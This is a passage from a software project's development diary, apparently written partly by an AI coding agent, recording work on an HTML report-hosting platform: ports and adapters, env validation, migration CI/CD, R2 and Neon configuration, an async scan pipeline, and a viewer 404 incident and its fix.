- **`src/ports.ts`** — `ReportRepository`, `BlobStore` (R2 key scheme), `IdempotencyStore` (begin→proceed/replay/in_flight, reuse-diff-body→422 kind; ADR-0039), `EventOutbox` (transactional outbox, ADR-0021), `ScanQueue` (scan port — Phase-1 stub yields clean), `PlanLimiter` (ADR-0006), pure services `IdGenerator`/`SlugFactory`/`Clock`, and `UnitOfWork` (atomic repo+outbox+idempotency, ADR-0037 §5). Fallible I/O returns `Promise<Result<T,AppError>>` (ADR-0024) — no throwing.
- **`src/testing/` (exported via the `./testing` subpath)** — in-memory fakes for every port + deterministic `SequentialIdGenerator`/`SequentialSlugFactory`/`FixedClock` + `PassThroughUnitOfWork`. **6 contract tests** verify the fakes match the port semantics (idempotency replay/in-flight/422, blob put/read/delete-prefix, repo slug+id round-trip, outbox ordering, plan-limit toggle).

**Verification (all local):** `pnpm test` → **32** (domain 20 + db 6 + application 6) ✓; all-package typecheck ✓ (now covers `arp-application`); `pnpm docs:check` ✓. No new deps beyond the workspace `arp-domain` link.

**Next:** 1d — `UploadReportUseCase` (content-only pipeline: auth → scope → idempotency → folder/canWrite → sync pre-checks → blob put → UnitOfWork commit of report+outbox+idempotency → enqueue scan), TDD'd against these fakes; then 1e viewer loader, 1f promotion. PR-A (migration runner) is now also unblocked (#17 merged; `NEON_PROJECT_ID` repo variable set).

**Process:** worktree `feat/phase-1c2-ports`, branched off `main` (`5a46a90`). Ports + fakes only — no use cases yet (that's 1d).

### 2026-06-04 — Vercel deploy-404 fully fixed (Turbo remote cache) + Phase 1 VS-1: UploadReportUseCase · worktree `feat/phase-1d-upload-usecase`

Operator chose a **thin vertical slice** to reach a manually-testable upload→view UI fastest: VS-1 `UploadReportUseCase` (this) → VS-2 real Neon/R2 adapters + scan-stub promotion → VS-3 HTTP route + viewer + deploy (= clickable).

**Deploy-404 root cause fully resolved.** Earlier `VERCEL_FORCE_NO_BUILD_CACHE=1` disabled *Vercel's* build cache, but the app still 404'd because **Turbo's remote cache replayed `arp-app:build`** (`cache hit, replaying logs`) so `remix vite:build` never re-ran and `vercelPreset()` was never detected → plain Node output → 404 on all routes (Vercel reported the deploy READY regardless). Fix: set **`TURBO_FORCE=true`** on both Vercel projects (+ keep `VERCEL_FORCE_NO_BUILD_CACHE=1`). Verified: a clean redeploy re-ran vite/SSR (21s, no replay), preset detected, `/health` → 200. All future app deploys serve correctly — the prerequisite for any manual UI test.

**VS-1 — `UploadReportUseCase` (`packages/application/src/use-cases/upload-report.ts`):** the content-only pipeline (ADR-0037/0039/0040), pure orchestration over the ports — scope (`reports:write`→403) → `BundleProcessor` pre-checks (new port: MIME/zip/entry-doc/caps + content hash; SVG→415, etc.) → idempotency (explicit or derived key; replay / in-flight→409 / reuse-diff-body→422) → `PlanLimiter` (402) → create vs re-upload (domain `createReport`/`addVersion`; cross-org→403) → R2-first blob put → `UnitOfWork` commit of save+outbox+idempotency → enqueue scan → `{slug,version,scan_status}`. Added the `BundleProcessor` port + a `FakeBundleProcessor`. **8 use-case tests** (scope/create/SVG-passthrough/plan-limit/replay/422/re-upload-v2/cross-org). `pnpm test` → **40** total ✓; all-package typecheck + `docs:check` ✓.

**Next (VS-2):** real adapters — Drizzle `ReportRepository` (Neon), R2 `BlobStore`, idempotency/outbox tables, and the **scan-stub adapter** (`enqueueScan` → emits `ReportVersionScanned(clean)` → `PromoteVersionUseCase` promotes), then VS-3 wires `POST /api/v1/reports` + the viewer + deploy. **Manual UI test becomes possible at the end of VS-3.**

**Process:** worktree `feat/phase-1d-upload-usecase`, branched off `main` (`61c68e9`). Pure use case + fakes; no infra yet.

### 2026-06-04 — Env-var validation: `packages/env` (Zod + @t3-oss/env-core) · ADR-0043 · worktree `feat/env-validation`

Operator asked to validate env vars with Zod (à la `zora-pantheon/.../environment`), and to research better examples first. Research found the bare `parse(process.env)` reference is fine for a backend-only service but risky for **our** client-bundled Remix apps — the real hazard is leaking a server secret to the browser. So we adopt **`@t3-oss/env-core` + Zod** (ADR-0043), which adds the server/client split the bare pattern lacks.

**`packages/env` (`arp-env`, deps `@t3-oss/env-core` + `zod` 4):**
- `defineEnv(runtimeEnv = process.env)` wraps our Zod schemas with `createEnv`: **server** schema (`DATABASE_URL`, `R2_*`, `CLERK_SECRET_KEY`, Upstash optional) + **client** schema (`PUBLIC_CLERK_PUBLISHABLE_KEY`, `clientPrefix:'PUBLIC_'`) + the **Vercel preset** (typed `VERCEL_*`), with `emptyStringAsUndefined` + `onInvalidAccess`. Server secrets can't reach the client bundle (enforced at type+runtime); misconfig fails fast at boot.
- `schema-helpers.ts` (`trimmedString`/`coercedNumber`/`boolFromString`/`csvList`) + `schema.ts` (the contract) + side-effect-free `index.ts` (the package validates nothing until a consumer calls `defineEnv`; tests inject a mock runtimeEnv).
- **4 tests** (valid parse + NODE_ENV default, fail-fast on missing/malformed `DATABASE_URL`, empty-string→undefined). `pnpm test` → **44**; all-package typecheck + `docs:check` ✓.

**Boundary-only (ADR-0024):** Zod/t3-env live in `packages/env`, `apps/*`, `packages/adapters/*` — never in `domain`/`application`. Zod will also back HTTP request-body validation later (ADR-0040).

**Next:** VS-2 (real Neon/R2 adapters) is the first consumer — its composition root calls `defineEnv()` once. Then VS-3 wires the apps (incl. the `PUBLIC_*` client vars) → manually testable upload→view.

**Process:** worktree `feat/env-validation`, branched off `main` (`c9361b7`). New package + ADR-0043; no consumers wired yet (VS-2 does that).

### 2026-06-04 — Wire the Biome lint+format gate (folded into PR #23)

The v7 spec (`docs/spec.html`) has always listed `biome ci .` as a **required** PR check (lint + format across the monorepo), but no `biome.json` or workflow existed — so the gate was vapor. Operator called it "primordial"; wired it now, in the env-validation PR, rather than as a standalone follow-up.

- **`biome.json`** (Biome 2.4.16): formatter = **2-space indent, double quotes, line width 100** (chosen to match the dominant existing layout — the codebase was already 2-space; quotes were mixed and unenforced, settled on double per operator). `linter.recommended`, `organizeImports` on. Excludes `docs/` (the design docs/spec.html — validated by the docs-conformance harness, not lintable source; its embedded `<style>`/`<script>` tripped CSS rules), plus generated output (`drizzle/`, `.features-gen/`, `*.gen.ts`, playwright reports).
- **Scripts:** root `lint` (`biome ci .`) + `format` (`biome check --write .`). **Workflow** `.github/workflows/biome.yml` mirrors `unit.yml` (Node 24, Corepack pnpm 10, frozen install → `pnpm lint`).
- **One-time normalization:** `biome check --write` reformatted 56 source files (quotes/indent/wrapping/import-order, no behavior change) + replaced the smoke step defs' empty-fixture `({}, …)` with `(_, …)` for `noEmptyPattern`. Verified: `pnpm lint` green, **44** unit tests + **26** docs-conformance tests pass, all-package typecheck + `docs:check` ✓.
- No ADR — this **implements** an existing spec decision, not a new one. Also gives Finding 2b (boundary-import enforcement) a home: a future `no-restricted-imports`-style rule barring `arp-env` from `domain`/`application` can land in this config.

**Process:** same worktree/branch as the env package above.

### 2026-06-04 — Migration CI/CD pipeline · worktree `ci/db-migration-pipeline`

While starting the Phase-1 real-DB slice, the question "who applies the schema migration to prod?" came up. Answer (operator directive, ADR-017/019): **only CI/CD — never a human, never locally.** The committed migration `0000` had never been applied to any persistent DB (deferred since 1c.1). This builds the runner that was planned-but-unbuilt.

- **`packages/db` scripts:** `db:migrate` (`drizzle-kit migrate`) + `db:check` (`drizzle-kit check`, DB-less folder/journal consistency). Added `pg` so drizzle-kit can connect in CI.
- **`migration-check.yml`** (PR, paths `packages/db/**`): `db:check`, then create an ephemeral Neon branch via the API → `db:migrate` against it → delete the branch (`if: always()`). Branch deletion is the rollback; prod is never touched. Verification gate, forward-only.
- **`migrate-db.yml`** (push to `main`, paths `packages/db/**`): resolve the **default (`main`/prod) branch** connection URI from the Neon API (db `ai_report_platform`, role `app`) and apply pending migrations. The **only** path that mutates prod; serialized via a `migrate-db-prod` concurrency group. **When this PR merges, the `migrate-db` job applies `0000` to prod Neon** — the first persistent schema apply.
- Both use `NEON_API_KEY` (secret) + `NEON_PROJECT_ID` (variable), already set; the connection URI is fetched at run time and `::add-mask::`ed, so **no `DATABASE_URL` is stored or handled locally**. `docs/db-design.md` Migrations section extended to describe both workflows.

**Why this came up now:** the real-DB upload→view slice (VS-2) needs the schema live on prod Neon + R2 app credentials. This PR unblocks the DB half. **Still open for VS-2:** R2 has no application access key yet (the R2 module creates only the bucket; sole S3 keys are tf-state-scoped) — an R2 token must be provisioned + `R2_*`/`DATABASE_URL` added to the Vercel **preview** target (currently production-only) before the upload route can read/write on a PR preview.

**Drift found while wiring this:** the prod Neon branch's actual database is **`neondb`** owned by **`neondb_owner`** (+ Clerk RLS roles `authenticator`/`anonymous`/`authenticated`), **not** the Terraform-declared `ai_report_platform` / `app` (`infra/terraform/modules/neon-project`). So either `neon_database.main` / `neon_role.main` were never applied or the project kept Neon's defaults. Vercel's `DATABASE_URL` (the project connection_uri output) therefore points at `neondb`. Both workflows now **discover** the db + owning role from the branch (`.databases[0].name` / `.owner_name`) rather than assuming — robust to the drift. **Follow-up (not this PR):** reconcile Terraform vs reality — either apply the declared db/role or update the module to match `neondb`/`neondb_owner`. The VS-2 adapters will connect to `neondb`.

**Verified:** `migration-check` is green — it creates an ephemeral Neon branch, applies `0000` (`[✓] migrations applied successfully!`), and deletes the branch; a leftover-branch sweep self-heals orphans from earlier runs.

**Process:** worktree `ci/db-migration-pipeline`, branched off `main` (`806a0f1`). Active sibling worktree `feat/upload-view-slice` (the adapters + routes, parked until this lands + R2 is provisioned). No ADR (implements the existing forward-only migration decision).

### 2026-06-05 — Schema live on prod; adapters started; R2 + preview env wiring

**Milestones:** PR #24 (migration CI/CD) merged → the `migrate-db` job applied migration `0000` to **prod Neon** (`neondb`) — first persistent schema apply, via CI/CD only. PR #25 (e2e gate cleanup) open. Pruned the merged/stale worktrees.

**`arp-adapters` started** (worktree `feat/arp-adapters`): pure-service port impls — `UuidV7IdGenerator`, `NanoidSlugFactory`, `Sha256Hasher`, `SystemClock` (+9 tests). Drizzle repo / R2 store / idempotency / outbox / unit-of-work land next.

**R2 + preview env wiring (worktree `chore/prod-env-r2-preview`):** the app had no R2 S3 credential (the bucket exists; the only S3 keys are tf-state-scoped) and the runtime env vars were **production-target only**, so PR previews couldn't serve the data plane. Changes:
- New prod vars `r2_access_key_id` / `r2_secret_access_key` (sensitive), wired into the app's Vercel env as `R2_ACCESS_KEY_ID` / `R2_SECRET_ACCESS_KEY`.
- `DATABASE_URL`, `CLERK_*`, `R2_*` now target **`production` + `preview`** (previews share the prod Neon DB + R2 bucket — acceptable pre-launch with no staging; revisit with per-PR Neon branches / R2 prefixes once there's real data).
- `terraform.yml` prod plan + apply jobs feed `TF_VAR_r2_access_key_id` / `TF_VAR_r2_secret_access_key` from new GH secrets `R2_APP_ACCESS_KEY_ID` / `R2_APP_SECRET_ACCESS_KEY`.

**Operator actions to make prod applyable + R2-capable:** (1) create the R2 app token (dashboard, Object R&W, scope `arp-reports-prod`) → set the two `R2_APP_*` GH secrets (and add to `.tfvars.local` for local applies); (2) put real `pk_live_`/`sk_live_` Clerk keys in `CLERK_PUBLISHABLE_KEY_PROD` (variable) + `CLERK_SECRET_KEY_PROD` (secret) so `tf.sh prod apply` stops failing on the `REPLACE_ME` placeholders. On merge to `main`, `terraform.yml` applies prod and the env reaches both targets.

**Process:** worktree `chore/prod-env-r2-preview`, off `main` (`e563c59`). Active worktrees: `feat/arp-adapters` (in progress), `ci/e2e-gate-cleanup` (PR #25). No ADR (env composition detail).

---

## 2026-06-10 — Align prod DB to `ai_report_platform`/`app`; drop `neondb`

**What broke:** the upload→view demo 500'd with `relation … does not exist`. Root cause chain: a `terraform apply` had recreated the prod Neon project (`br-tiny-hall-aqqs1klw` → `steep-bar-51267535`/`br-wispy-flower-aqtttj6n`), wiping the schema; `migrate-db` only triggered on `packages/db/**` so nothing re-applied it; once `migrate-db` was made migrate-on-deploy (#32), its `.databases[0]` discovery applied `0000` to **`ai_report_platform`** while the app's `DATABASE_URL` (= `neon_project.connection_uri`) read Neon's default **`neondb`** — schema in the wrong database.

**Decision (operator):** standardize on the dedicated TF-declared **`ai_report_platform`** (owner role **`app`**) and **drop `neondb`** entirely. Rationale: dedicated least-privilege role over Neon's broad default `neondb_owner`; one database, no ambiguity.

**Changes (PR `fix/align-prod-db-to-app`):**
- `modules/neon-project/outputs.tf` — `prod_connection_uri` now builds the app-db URI from `neon_role.main` + `neon_database.main` + `neon_project.database_host`, instead of `neon_project.connection_uri` (which pointed at `neondb`). On apply, Vercel's `DATABASE_URL` repoints to `ai_report_platform`/`app`.
- `migrate-db.yml` — selects the `ai_report_platform` database by NAME (fails loudly if absent), not `.databases[0]`. Run log must read `db=ai_report_platform role=app`.
- `docs/ops.md` — `neondb` references removed; recovery/verify target is `ai_report_platform`.

**Still open:** the physical `neondb` database (Neon's auto-created default, NOT TF-managed) is now empty + unused but still exists. Dropping it is a deliberate, destructive prod-DB op via the Neon API — pending explicit operator authorization. Older diary entries that describe the `neondb` drift are left intact as the historical record.

**Process:** worktree `fix/align-prod-db-to-app`, off `main` (`dc90a70`). PRs #32 (migrate-on-deploy) + #33 (prevent_destroy) merged.

---

## 2026-06-10 — 🎉 Phase 1 upload→view is LIVE; bot-merge removed

**Milestone:** the manually-testable upload→view vertical slice works end-to-end in production. `app.agranado.com/upload` accepts pasted HTML → stored in Neon (`ai_report_platform`) + R2 → served at `app.agranado.com/r/<slug>` with the full ADR-013 security stack (enforcing+sandbox CSP, COOP/CORP, OAC, HSTS, `X-Robots-Tag: noindex`, `cache-control: no-store`). First real report uploaded by the operator (`/r/a6fzoxckZ6`). Path to green required, in order: PR #29 (adapters + routes), #30 (Clerk `PUBLIC_` env + public previews), #31 (signed merge commits, ADR-0044), #32 (migrate-on-deploy), #33 (`prevent_destroy` on prod Neon), #35 (align app+migrate-db to `ai_report_platform`/`app`, drop `neondb` usage) → `apply-prod` repointed `DATABASE_URL` → production redeploy picked up the new env.

**This PR (`chore/remove-bot-merge`):** removes the obsolete bot-merge machinery now that ADR-0044 (signed merge commits) is the merge path — deletes `.github/workflows/bot-merge.yml`, the `data "github_user" "merge_bot"` source + `pull_request_bypassers` from the github-repo module, the obsolete `docs/ops.md` section, and corrects the `commitlint.yml` header. `apply-shared` will drop the PR-bypasser from branch protection (no resource replacement).

**Open follow-ups:** (1) physically drop the empty `neondb` (Neon default, not TF-managed — needs a deliberate console/API delete); (2) promoting scan stub + ADR-0038 viewer state machine (next); (3) `deleted_at IS NULL` repo filter; (4) real API `POST /api/v1/reports`, Clerk auth (drop `DEMO_ACTOR`), dedicated view-origin (ADR-0038), e2e step defs; (5) pre-launch: real scanner, preview isolation. The stale `ci/e2e-gate-cleanup` branch (no PR) is unmerged — review or prune. The `MERGE_BOT_*` repo secrets/variables are now unused (manual `gh secret delete` when convenient — not TF-managed).

**Process:** worktree `chore/remove-bot-merge`, off `main` (`17a560d`). All prior feature worktrees pruned.

---

## 2026-06-10 — Infra credential-drift cleanup + tf.sh lock hardening

After #35/#36/#37 merged, `apply-shared` on `main` failed repeatedly with "lock held by another tf.sh invocation." It was **not** a stuck lock and **not** a code issue — it was accumulated credential drift from the Neon console work, compounded by a `tf.sh` bug:

- **Root cause:** `PG_LOCK_URL` still pointed at `ep-divine-glitter` — an endpoint of the *old* Neon project that was destroyed when prod was recreated (`br-tiny-hall` → `steep-bar-51267535`). psql couldn't connect, and `acquire_lock`'s `psql … 2>/dev/null || echo "f"` swallowed the connection failure as "lock held." Repointed `PG_LOCK_URL` (secret + `.tfvars.local`) at the live project's **direct** endpoint (`ep-shy-pine-aqqb9ts5…`, no `-pooler`).
- Also stale: the CI `NEON_API_KEY` secret (neon provider 401'd on plan) — re-synced from the working local key.
- `gh` gotcha hit mid-fix: `source .tfvars.local` exported a bare `GITHUB_TOKEN` that shadowed the `gh` keyring login → `gh secret set` 401'd until run with `env -u GH_TOKEN -u GITHUB_TOKEN`.

**This PR (`chore/infra-lock-hardening`):** `tf.sh acquire_lock` now preflights connectivity and fails with a clear "cannot connect to PG_LOCK_URL" instead of misreporting it as contention. `.tfvars.local.example` warns against a bare `GITHUB_TOKEN`/`GH_TOKEN` (gh-shadowing) and clarifies the lock host (one Neon project, direct endpoint). `docs/infra.md` reconciles the lock-host section (no separate bootstrap project) and rewrites the stuck-lock runbook (rule out connectivity first; terminate the backend, not advisory-unlock from another session).

Note: the advisory lock is session-scoped and acquired+released within a single `psql -c`, so real apply-serialization rests on the GitHub Actions concurrency group; making the lock span the whole apply is a possible future improvement, not done here.

**Operator follow-ups (credentials, out of band):** rotate the `app` DB password (it appeared in a session transcript), remove the bare `GITHUB_TOKEN` from local `.tfvars.local`, and confirm `.tfvars.local` ↔ CI secrets are back in sync. Stale `ci/e2e-gate-cleanup` branch (superseded by the gate already on `main`) pruned.

---

## 2026-06-10 — Production upload API: `POST /api/v1/reports` (#40)

**Milestone:** the production HTTP upload API is live — `POST /api/v1/reports` (ADR-0037 / ADR-0039 / ADR-0040), the contract surface the `/upload` demo page stood in for. This closes most of open follow-up (4) from the "Phase 1 LIVE" entry above (real API route + e2e seam); Clerk auth (dropping `DEMO_ACTOR`) and the dedicated view-origin remain.

**Shipped (issue #39 → PR #40), test-first as vertical slices:**
- **`packages/http` (`arp-http`)** — new transport-adapter package. `uploadResultToHttp`: pure `Result<UploadOutcome, AppError> → HttpResponse` — 201 JSON + `Location` on success, RFC 9457 `application/problem+json` over the full ADR-0040 `code` registry on error. The `problemFor` switch is **exhaustive** (no `default` → a new `AppError` kind fails the typecheck gate), and **500s emit a generic detail** (never echo raw adapter/infra messages). 15 unit tests — the only pure-TDD seam.
- **Actor-resolver seam** (`apps/app/app/server/auth.server.ts`) — `resolveUploadActor(request) → Result<UploadActor, AppError>`; Phase-1 returns the seeded `DEMO_ACTOR`, real API-key / Clerk auth slots in behind the same signature (401 Unauthenticated / 403 InsufficientScope) without the route changing.
- **Resource route** (`apps/app/app/routes/api.v1.reports.ts`) — thin transport adapter: resolve actor → parse multipart `file` + `Idempotency-Key` → `uploadReport` → serialize via the mapper. The 201 reports `scan_status: pending` **per the contract** (promotion is async from the client's view); the Phase-1 always-clean stub then promotes (genuinely **best-effort** — wrapped in try/catch so a promotion failure never turns the earned 201 into a 500) so `/r/<slug>` serves. `folder_path` rejected on re-upload (create-only); non-POST → 405.
- **e2e** — `@smoke` upload-API scenario in `tests/e2e/smoke/` (invisible to the feature-catalog bijection validator): POST → 201 → GET `view_url` → 200 serving the content, green against the live Vercel preview (ADR-0019). The `@phase-1` catalog features stay the acceptance spec — their internal-state ("entry doc index.html", "org root folder") and async-scan-timing ("no live version until ReportVersionScanned clean") scenarios can't be honestly black-boxed against the synchronous-promote stub, and playwright-bdd errors at collection on any undefined step. `grep` widens to `@phase-1` when the Phase-1.5 async scanner makes them truthful.
- **OpenAPI** — documented the `405` / `method_not_allowed` the route emits (registry + response + operation).

**Review:** dual-AI (Claude + Gemini, ADR-030) plus an independent local review, driven to green over 3 `/pr-iterate` passes. Applied: 500 info-disclosure (HIGH), best-effort promotion (MEDIUM), exhaustive switch (MEDIUM), e2e path-coupling (MEDIUM). The bot reconciliation pass verdict: "Ready to merge."

**Deferred → issue #41 (Phase 1.5):** `view_url` / `Location` emit `app-origin/r/<slug>` (correct for today's co-located viewer — the e2e smoke proves the round-trip) rather than the canonical PSL-isolated `view.<domain>/<slug>` (ADR-002 / ADR-0038). Operator chose **merge-now + tracked follow-up** (separate `apps/view` deploy + DNS + a validated `VIEWER_BASE_URL` env seam per ADR-0043 + `/r/`→`/` path), to land with the async scanner. Also tracked there: RFC 9457 `instance` — deferred because the naive value (`request.url`) is constant per endpoint and so isn't the per-occurrence anchor RFC 9457 §3.2 intends; needs a request-id middleware.

**Process:** worktree `feat/api-v1-reports`, off `main` (`7973eae`); merged as `2545f95` (#40). The infra worktree `chore/infra-lock-hardening` (#38) also merged. Both feature worktrees pruned. (This entry shipped via a small `docs/diary-phase1-api` worktree, since `main` is PR-protected.)

---

## 2026-06-11 — Phase 1.5a: async content-scan pipeline (ADR-0045)

**Milestone:** the scan pipeline is now genuinely **asynchronous** — uploads commit `pending`, and a background drain promotes the clean version (no more synchronous always-clean promote in the request). The verdict is still a **dummy `clean` stub** (invite-only MVP); the *transport* is real. Full rationale in **ADR-0045**.

**Architecture (PR #43, merged `f2afd1c`):**
- **pg-boss on the existing Neon DB** (pinned `12.18.3`, no Redis — BullMQ is incompatible with Upstash serverless Redis). It **self-manages its `pgboss` schema** (`migrate:true`; the `app` role owns the DB) — a deliberate exception to the migrate-db pipeline, because pg-boss 12's partitioned per-queue tables can't be frozen into a static migration. Confined to two adapter files behind a `ScanWorkQueue` port → swappable.
- **`Scanner` port + `CleanStubScanner`** — the verdict-engine seam; the real ClamAV/heuristics engine slots in here later with zero call-site change.
- **`drainScans`** reconciles `queued` `scan_jobs` (the work list of record) → fetch → `markRunning` → scan → `processScanResult` (monotonic promote). Uploads stay fast (no pg-boss on the upload path); nothing strands at `pending`.
- **`POST /internal/scan-drain`** — fail-closed bearer-secret auth; **no cron-overlap lock** (pg-boss `fetch` is `FOR UPDATE SKIP LOCKED`). Triggered by a free **Cloudflare cron Worker** (`modules/scan-cron`) every minute.
- **Content-scanning model** documented: for untrusted static HTML, *origin isolation + sandbox CSP (ADR-013/038) is the primary control — isolation > AV*; signature AV is one defense-in-depth layer.

**Flip (PR `refactor/scan-async-only`):** removed the synchronous `processScanResult("clean")` from `api.v1.reports.ts` + `upload.tsx`, so the 201 truthfully returns `scan_status: pending` and the viewer shows the ADR-0038 holding page until the drain promotes. e2e smoke updated to assert the holding page (always-green in CI) + a drain→promote round-trip guarded by `SCAN_DRAIN_SECRET` (CI doesn't expose it yet — follow-up).

**⚠ Operator action (apply failed):** the merge-triggered `apply-prod` created the `SCAN_DRAIN_SECRET` env (on app+view, prod+preview) but **failed creating the Cloudflare Worker** — `Authentication error (10000)`: the CF API token lacks **`Workers Scripts: Edit`**. Grant that scope, then **re-run the apply via CI** (per the infra-applies-via-CI/CD rule) so the cron Worker + trigger land. Until then the drain has no scheduled trigger on prod (the e2e/manual `POST /internal/scan-drain` still works).

**Process:** worktree `feat/phase-1.5a-scan-pipeline` (#43) merged + pruned; the flip on `refactor/scan-async-only`, off `main` (`f2afd1c`). Scanning section mirrored into `~/Desktop/html-report-platform-spec.html`. The real scan **engine** (ClamAV + heuristics) is a later phase.

---

## 2026-06-12 — 🎉 Phase 1.5a async cutover LIVE on prod (the scan-cron saga)

**Milestone:** the async scan pipeline is fully operational in production. Uploads commit `pending`; the **Cloudflare cron Worker** (`arp-scan-drain-prod`) pokes `POST /internal/scan-drain` every minute; the drain promotes the clean (stub) version → `/r/<slug>` serves it within ~1–2 min. `apply-prod` is green; the synchronous promote is gone (PR #44).

**Cutover order (all merged):** #43 machinery → **#44 async-only flip** (removed the sync promote) → #45 subdomain+cron module → #46 + #47 hotfixes (below). `apply-prod` on `main` (`5598e1a`) created `cloudflare_workers_cron_trigger.scan_drain`.

**The scan-cron saga — three operator/agent snags getting the cron Worker deployed:**
1. **CF token scope** — first `apply-prod` failed `Authentication error (10000)`: the Cloudflare API token lacked **Workers Scripts: Edit**. Operator granted it (token value unchanged → no secret rotation).
2. **workers.dev subdomain (CF `10063`)** — a Worker cron trigger can't be created until the account has a workers.dev subdomain, and **no native TF resource exists** (v4 or v5 — checked the full resource list of both; only the per-script `workers_script_subdomain`). So we register it via the API in a `null_resource` (PR #45). *Aside:* this killed a brief detour to upgrade the CF provider v4→v5 — v5 doesn't add the resource either, so we stayed on v4.40.
3. **Two `null_resource` bugs (both mine), fixed in #46 + #47:** (a) the success-check grep was whitespace-fragile (`"success":true` vs CF's pretty-printed `"success": true`) → matched a *successful* call as failure; (b) the subdomain `PUT` is **not idempotent** — re-`PUT` of an existing subdomain returns `success:false`, so the tainted `null_resource` kept failing on re-apply. Final design: **GET-then-PUT** — only `PUT` when no subdomain is set; re-applies are no-ops.

**Sequencing lesson:** #44 (async-only) was merged before the cron was confirmed live (number-confusion at the merge button), so prod uploads briefly stalled at the holding page until #47's apply brought the drain online — recoverable (the drain reconciler backfills queued jobs), but the gate existed for a reason. Verifying between merges (the plan's intent) caught both `null_resource` bugs before they could do worse.

**Process:** worktrees `refactor/scan-async-only` (#44), `fix/scan-cron-workers-subdomain` (#45), `fix/scan-cron-success-check` (#46), `fix/scan-cron-subdomain-idempotent` (#47) — all merged + pruned. Phase 1.5a complete; the real scan **engine** + the `view.<domain>` viewer-origin split (issue #41) are next.

### 2026-06-12 — Viewer-origin split complete: `view.<domain>/<slug>` is canonical (issue #41)

The viewer moved off the app origin onto the PSL-isolated `view.<domain>` origin (ADR-002 / ADR-0038), shipped as two PRs.

**PR #49 (`feat/view-origin-viewer`, additive)** — stood the viewer up on the view origin without changing `view_url` yet:
- Extracted the ADR-0038 §2 gate into a pure, unit-tested use case `resolveViewableReport(slug, reports)` (`packages/application`) — the security gate finally has coverage (8 tests: serve / scanning / flagged / blocked→notfound / deleted / non-clean-live→notfound / unknown-slug / infra-error). Defence-in-depth: refuses to serve unless the live version is `scan_status === "clean"`, even though ADR-0037 §8 already guarantees it.
- Wired `apps/view` composition root (`viewerDeps()` — slim `reports` + `blobs` only) and the `$slug` route serving from R2 under the full `viewHeaders()` stack.

**PR #50 (`refactor/view-url-canonical`, the flip)** — made `view.<domain>/<slug>` the canonical URL:
- New optional env var **`VIEW_ORIGIN`** (`packages/env`, Zod `z.url().optional()`) — Terraform sets it on prod only; previews/dev fall back to the request origin.
- Mapper `view_url = ${viewBaseUrl}/${slug}` (dropped the `/r/` prefix); `api.v1.reports.ts` + `upload.tsx` use `defineEnv().VIEW_ORIGIN ?? new URL(request.url).origin`.
- **Deleted `apps/app/app/routes/r.$slug.tsx`** — the viewer lives only on the view origin now; old `app/r/<slug>` links 404 (accepted pre-launch). The app middleware SW-block stays as defence-in-depth (its rationale updated — the app no longer serves untrusted HTML).
- e2e smoke now asserts the canonical `view_url` shape (slug is the whole path, no `/r/`, origin = `VIEW_ORIGIN` on prod); the cross-origin functional serve is post-merge prod verification (the gate behaviour is covered by the `resolveViewableReport` unit tests).
- Folded in the three #49 review carry-overs: corrected a wrong ADR citation (repository port is ADR-0020, not ADR-0024), hoisted the double `viewerDeps()` call, and gave thrown error responses (404/410/451/500) the `viewHeaders()` stack so even an error sets HSTS.

OpenAPI already documented `GET /{slug}` + `view_url` on `view.<domain>` (no change needed). Worktrees `feat/view-origin-viewer` (#49) + `refactor/view-url-canonical` (#50). Post-merge prod check: upload via the API → `view_url = https://view.<apex>/<slug>` serves the report under the ADR-013 stack, and `app.<apex>/r/<slug>` 404s.

### 2026-06-15 — Incident + fix: viewer 404'd every report (stale cached scan_status)

**Symptom:** after #50 merged and the canonical `view.<domain>/<slug>` flip went live, **every** report 404'd on the view origin — a fresh upload showed the holding page (200) then flipped to 404 the moment the scan drain ran, and a previously-served report (`PuvdqkAK68`) 404'd too. The flip itself was correct (canonical `view_url`, old `/r/` 404s, full ADR-013 header stack); the regression was in serving.

**Root cause:** `DrizzleReportRepository.save()` upserted `report_versions` rows with `ON CONFLICT DO NOTHING`. `report_versions.scan_status` is written **only** there (`completeScan` writes `scan_jobs`, a different table). So once a version row was inserted at upload (`scan_status = 'pending'`), the drain's promotion `save()` (`processScanResult`) updated `reports.live_version_id` correctly (that row uses `onConflictDoUpdate`) but **never refreshed the version's `scan_status`** — it stayed `'pending'` forever. The ADR-0038 viewer gate's defence-in-depth guard added in #49 (`live version must be scan_status === "clean"`, commit `f350b54`) then resolved every promoted report to `notfound` → 404. This is why Phase 1.5a served fine (the guard didn't exist yet — `live_version_id` alone sufficed) and why #49 silently introduced the latent failure that #50 exposed by deleting the working app-origin viewer. CI never caught it: adapter tests are pure mappers (no real-DB), and #50 had removed the e2e drain→serve assertion (it couldn't run cross-origin on previews).

**Fix (`fix/view-origin-serve`):**
- **Code** — `save()` now upserts versions via `upsertVersions()` with `ON CONFLICT (id) DO UPDATE SET scan_status = excluded.scan_status`. `scan_status` is the only mutable version field post-insert. Guarded by a connectionless `.toSQL()` unit test asserting the conflict clause refreshes `scan_status` (and is not `DO NOTHING`).
- **Data** — migration `0001_backfill_version_scan_status.sql` reconciles existing stale rows from the authoritative `scan_jobs` verdict (`status='done'`), fixing clean/flagged/blocked alike. Idempotent. Applied via the migrate-db pipeline on merge.

**Test-gap follow-up (tracked, not in this PR):** adapter SQL has no fast regression harness (ADR-0019 leaves it to e2e against real Neon, but the relevant e2e serve step can't run cross-origin on previews). Options: a pglite-backed repository integration test (needs a `DbContext` injection seam + a dev dependency), or wiring an e2e that hits the view origin. Verified this fix on the prod view origin post-deploy (upload → drain → `view.<apex>/<slug>` serves the content under the ADR-013 stack).

### 2026-06-15 — Adapter-SQL integration test harness (pglite) — closes #52

The 2026-06-15 viewer-404 incident slipped past CI because adapter tests were pure mappers (no DB) and the e2e serve check couldn't run cross-origin on previews — so SQL-semantics bugs (ON CONFLICT, transactions) had no fast regression coverage. This adds that tier.

- **Engine:** `@electric-sql/pglite` (the real Postgres engine, in-process WASM) + `drizzle-orm/pglite`, a new **dev-dependency** in `packages/adapters`. Fast tier *below* the real-Neon e2e (which is unchanged).
- **Seam:** `DbContext` now has an overloaded constructor — `new DbContext(url)` for prod (Neon Pool) and `new DbContext({ base })` for tests (an injected drizzle `Db`). The pglite db is cast to `Db` at the harness boundary only.
- **Harness:** `packages/adapters/src/testing/pglite.ts` — `makeTestDb()` spins a fresh in-memory pglite, applies the committed `drizzle/*.sql` migrations (real DDL, incl. the `0001` backfill), and wraps it in a `DbContext`; `seedIdentity()` + `sampleReport()` build the FK prerequisites + a fixture aggregate.
